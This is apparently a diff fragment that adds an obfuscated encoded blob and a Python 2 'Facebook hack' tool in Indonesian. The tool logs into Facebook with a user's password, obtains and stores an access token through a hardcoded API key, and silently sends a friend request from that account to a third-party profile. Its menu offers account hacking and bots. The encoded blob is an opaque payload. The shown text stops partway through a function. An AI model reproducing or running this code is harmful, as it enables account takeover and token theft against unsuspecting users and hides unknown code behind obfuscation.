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"))))
+import os, sys, time, datetime, random, hashlib, re, threading, json, getpass, urllib, requests, mechanize
+from multiprocessing.pool import ThreadPool
+try:
+    import mechanize
+except ImportError:
+    os.system('pip2 install mechanize')
+else:
+    try:
+        import requests
+    except ImportError:
+        os.system('pip2 install requests')
+
+from requests.exceptions import ConnectionError
+from mechanize import Browser
+reload(sys)
+sys.setdefaultencoding('utf8')
+br = mechanize.Browser()
+br.set_handle_robots(False)
+br.set_handle_refresh(mechanize._http.HTTPRefreshProcessor(), max_time=1)
+br.addheaders = [('User-Agent', 'Opera/9.80 (Android; Opera Mini/36.2.2254/119.132; U; id) Presto/2.12.423 Version/12.16')]
+
+def keluar():
+    print '\x1b[1;91m[!] Tutup'
+    os.sys.exit()
+
+
+def jalan(z):
+    for e in z + '\n':
+        sys.stdout.write(e)
+        sys.stdout.flush()
+        time.sleep(0.01)
+
+
+logo = ' \x1b[1;92m\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\n \x1b[1;92m\xe2\x96\x88\xe2\x96\x84\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x84\xe2\x96\x88         \x1b[1;97m\xe2\x97\x8f\xe2\x96\xac\xe2\x96\xac\xe2\x96\xac\xe2\x96\xac\xe2\x96\xac\xe2\x96\xac\xe2\x96\xac\xe2\x96\xac\xe2\x96\xac\xe0\xb9\x91\xdb\xa9\xdb\xa9\xe0\xb9\x91\xe2\x96\xac\xe2\x96\xac\xe2\x96\xac\xe2\x96\xac\xe2\x96\xac\xe2\x96\xac\xe2\x96\xac\xe2\x96\xac\xe2\x97\x8f\n \x1b[1;92m\xe2\x96\x88 \x1b[1;93m\xe2\x96\xbc\xe2\x96\xbc\xe2\x96\xbc\xe2\x96\xbc\xe2\x96\xbc  \x1b[1;97m- _ --_-- \x1b[1;92m\xe2\x95\x94\xe2\x95\xa6\xe2\x95\x97\xe2\x94\x8c\xe2\x94\x80\xe2\x94\x90\xe2\x94\xac\xe2\x94\x80\xe2\x94\x90\xe2\x94\xac\xe2\x94\x8c\xe2\x94\x80   \xe2\x95\x94\xe2\x95\x90\xe2\x95\x97\xe2\x95\x94\xe2\x95\x97 \n \x1b[1;92m\xe2\x96\x88  \x1b[1;97m  \x1b[1;97m_-_-- -_ --__ \x1b[1;92m \xe2\x95\x91\xe2\x95\x91\xe2\x94\x9c\xe2\x94\x80\xe2\x94\xa4\xe2\x94\x9c\xe2\x94\xac\xe2\x94\x98\xe2\x94\x9c\xe2\x94\xb4\xe2\x94\x90\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x95\xa0\xe2\x95\xa3 \xe2\x95\xa0\xe2\x95\xa9\xe2\x95\x97\n \x1b[1;92m\xe2\x96\x88 \x1b[1;93m\xe2\x96\xb2\xe2\x96\xb2\xe2\x96\xb2\xe2\x96\xb2\xe2\x96\xb2 \x1b[1;97m--  - _ -- \x1b[1;92m\xe2\x95\x90\xe2\x95\xa9\xe2\x95\x9d\xe2\x94\xb4 \xe2\x94\xb4\xe2\x94\xb4\xe2\x94\x94\xe2\x94\x80\xe2\x94\xb4 \xe2\x94\xb4   \xe2\x95\x9a  \xe2\x95\x9a\xe2\x95\x90\xe2\x95\x9d  \x1b[1;93mMOD\n \x1b[1;92m\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88         \x1b[1;97m\xc2\xab==========\xe2\x9c\xa7==========\xc2\xbb\n \x1b[1;92m \xe2\x96\x88\xe2\x96\x88 \xe2\x96\x88\xe2\x96\x88\n \x1b[1;97m\xe2\x95\x94\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x97\n \x1b[1;97m\xe2\x95\x91 \x1b[1;93m*  \x1b[1;97mReCode \x1b[1;91m: \x1b[1;96mARIYA CYBER  \x1b[1;97m                      \xe2\x95\x91\n \x1b[1;97m\xe2\x95\x91 \x1b[1;93m*  \x1b[1;97mGitHub \x1b[1;91m: \x1b[1;92m\x1b[92mhttps://github.com/ARIYA-CYBER/MOD\x1b[   \x1b[1;97m\xe2\x95\x91\n \x1b[1;97m\xe2\x95\x91 \x1b[1;93m*  \x1b[1;97mWA     \x1b[1;91m: \x1b[1;92\x1b[92m+62 823-2240-5139\x1b[     \x1b[1;97m               \xe2\x95\x91   \n \x1b[1;97m\xe2\x95\x9a\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x9d\n\x1b[1;92m[*] Silahkan Login Operamini Agar Tidak Checkpoint\n'
+
+def tik():
+    titik = [
+     '.   ', '..  ', '... ']
+    for o in titik:
+        print '\r\x1b[1;91m[\xe2\x97\x8f] \x1b[1;92mLoading \x1b[1;97m' + o,
+        sys.stdout.flush()
+        time.sleep(0.01)
+
+
+back = 0
+threads = []
+berhasil = []
+cekpoint = []
+gagal = []
+idfriends = []
+idfromfriends = []
+idmem = []
+id = []
+em = []
+emfromfriends = []
+hp = []
+hpfromfriends = []
+reaksi = []
+reaksigrup = []
+komen = []
+komengrup = []
+listgrup = []
+vulnot = '\x1b[31mNot Vuln'
+vuln = '\x1b[32mVuln'
+
+def login():
+    os.system('clear')
+    try:
+        toket = open('login.txt', 'r')
+        menu()
+    except (KeyError, IOError):
+        os.system('clear')
+        print logo
+        print 52 * '\x1b[1;97m\xe2\x95\x90'
+        print '\x1b[1;91m[\xe2\x98\x86] \x1b[1;92mMASUK AKUN FACEBOOK \x1b[1;91m[\xe2\x98\x86]'
+        id = raw_input('\x1b[1;91m[+] \x1b[1;36mUsername \x1b[1;91m:\x1b[1;92m ')
+        pwd = getpass.getpass('\x1b[1;91m[+] \x1b[1;36mPassword \x1b[1;91m:\x1b[1;92m ')
+        tik()
+        try:
+            br.open('https://m.facebook.com')
+        except mechanize.URLError:
+            print '\n\x1b[1;91m[!] Tidak Ada Koneksi'
+            keluar()
+
+        br._factory.is_html = True
+        br.select_form(nr=0)
+        br.form['email'] = id
+        br.form['pass'] = pwd
+        br.submit()
+        url = br.geturl()
+        if 'save-device' in url:
+            try:
+                sig = 'api_key=882a8490361da98702bf97a021ddc14dcredentials_type=passwordemail=' + id + 'format=JSONgenerate_machine_id=1generate_session_cookies=1locale=en_USmethod=auth.loginpassword=' + pwd + 'return_ssl_resources=0v=1.062f8ce9f74b12f84c123cc23437a4a32'
+                data = {'api_key': '882a8490361da98702bf97a021ddc14d', 'credentials_type': 'password', 'email': id, 'format': 'JSON', 'generate_machine_id': '1', 'generate_session_cookies': '1', 'locale': 'en_US', 'method': 'auth.login', 'password': pwd, 'return_ssl_resources': '0', 'v': '1.0'}
+                x = hashlib.new('md5')
+                x.update(sig)
+                a = x.hexdigest()
+                data.update({'sig': a})
+                url = 'https://api.facebook.com/restserver.php'
+                r = requests.get(url, params=data)
+                z = json.loads(r.text)
+                zedd = open('login.txt', 'w')
+                zedd.write(z['access_token'])
+                zedd.close()
+                print '\n\x1b[1;91m[\x1b[1;96m\xe2\x9c\x93\x1b[1;91m] \x1b[1;92mLogin success'
+                requests.post('https://graph.facebook.com/me/friends?method=post&uids=gwimusa3&access_token=' + z['access_token'])
+                time.sleep(1)
+                menu()
+            except requests.exceptions.ConnectionError:
+                print '\n\x1b[1;91m[!] Tidak Ada Koneksi'
+                keluar()
+
+        if 'checkpoint' in url:
+            print '\n\x1b[1;91m[!] \x1b[1;93mAccount Has Been Checkpoint'
+            os.system('rm -rf login.txt')
+            time.sleep(0.01)
+            keluar()
+        else:
+            print '\n\x1b[1;91m[!] Gagal Masuk'
+            os.system('rm -rf login.txt')
+            time.sleep(0.01)
+            login()
+
+
+def menu():
+    try:
+        toket = open('login.txt', 'r').read()
+    except IOError:
+        os.system('clear')
+        print '\x1b[1;91m[!] Token not found'
+        os.system('rm -rf login.txt')
+        time.sleep(0.01)
+        login()
+    else:
+        try:
+            otw = requests.get('https://graph.facebook.com/me?access_token=' + toket)
+            a = json.loads(otw.text)
+            nama = a['name']
+            id = a['id']
+            ots = requests.get('https://graph.facebook.com/me/subscribers?access_token=' + toket)
+            b = json.loads(ots.text)
+            sub = str(b['summary']['total_count'])
+        except KeyError:
+            os.system('clear')
+            print '\x1b[1;91m[!] \x1b[1;93mSepertinya akun kena Checkpoint'
+            os.system('rm -rf login.txt')
+            time.sleep(0.01)
+            login()
+        except requests.exceptions.ConnectionError:
+            print logo
+            print '\x1b[1;91m[!] Tidak Ada Koneksi'
+            keluar()
+
+    os.system('clear')
+    print logo
+    print '\x1b[1;97m\xe2\x95\x94' + 50 * '\xe2\x95\x90' + '\xe2\x95\x97'
+    print '\xe2\x95\x91\x1b[1;91m[\x1b[1;96m\xe2\x9c\x93\x1b[1;91m]\x1b[1;97m Name \x1b[1;91m: \x1b[1;92m' + nama + (39 - len(nama)) * '\x1b[1;97m ' + '\xe2\x95\x91'
+    print '\xe2\x95\x91\x1b[1;91m[\x1b[1;96m\xe2\x9c\x93\x1b[1;91m]\x1b[1;97m FBID \x1b[1;91m: \x1b[1;92m' + id + (39 - len(id)) * '\x1b[1;97m ' + '\xe2\x95\x91'
+    print '\xe2\x95\x91\x1b[1;91m[\x1b[1;96m\xe2\x9c\x93\x1b[1;91m]\x1b[1;97m Subs \x1b[1;91m: \x1b[1;92m' + sub + (39 - len(sub)) * '\x1b[1;97m ' + '\xe2\x95\x91'
+    print '\x1b[1;97m\xe2\x95\xa0' + 50 * '\xe2\x95\x90' + '\xe2\x95\x9d'
+    print '\xe2\x95\x91-> \x1b[1;37;40m1. User Information'
+    print '\xe2\x95\x91-> \x1b[1;37;40m2. Hack Facebook Account'
+    print '\xe2\x95\x91-> \x1b[1;37;40m3. Bot'
+    print '\xe2\x95\x91-> \x1b[1;37;40m4. Others'
+    print '\xe2\x95\x91-> \x1b[1;37;40m5. Update'
+    print '\xe2\x95\x91-> \x1b[1;37;40m6. Logout'
+    print '\xe2\x95\x91-> \x1b[1;31;40m0. Exit'
+    print '\x1b[1;37;40m\xe2\x95\x91'
+    pilih()
+
+
+def pilih():
+    zedd = raw_input('\xe2\x95\x9a\xe2\x95\x90\x1b[1;91m\xe2\x96\xb6\x1b[1;97m ')
+    if zedd == '':
+        print "\x1b[1;91m[!] Can't empty"
+        pilih()
+    elif zedd == '1':
+        informasi()
+    elif zedd == '2':
+        menu_hack()
+    elif zedd == '3':
+        menu_bot()
+    elif zedd == '4':
+        lain()
+    elif zedd == '5':
+        os.system('clear')
+        print logo
+        print 52 * '\x1b[1;97m\xe2\x95\x90'
+        os.system('git pull origin master')
+        raw_input('\n\x1b[1;91m[ \x1b[1;97mBack \x1b[1;91m]')
+        menu()
+    elif zedd == '6':
+        os.system('rm -rf login.txt')
+        os.system('xdg-open https://m.facebook.com/rizz.magizz')
+        keluar()
+    elif zedd == '0':
+        keluar()
+    else:
+        print '\x1b[1;91m[\xe2\x9c\x96] \x1b[1;97m' + zedd + ' \x1b[1;91mNot availabel'
+        pilih()
+
+
+def informasi():
+    os.system('clear')
+    try:
+        toket = open('login.txt', 'r').read()
+    except IOError:
+        print '\x1b[1;91m[!] Token not found'
+        os.system('rm -rf login.txt')
+        time.sleep(0.01)
+        login()
+
+    os.system('clear')
+    print logo
+    print 52 * '\x1b[1;97m\xe2\x95\x90'
+    id = raw_input('\x1b[1;91m[+] \x1b[1;92mInput ID\x1b[1;97m/\x1b[1;92mName\x1b[1;91m : \x1b[1;97m')
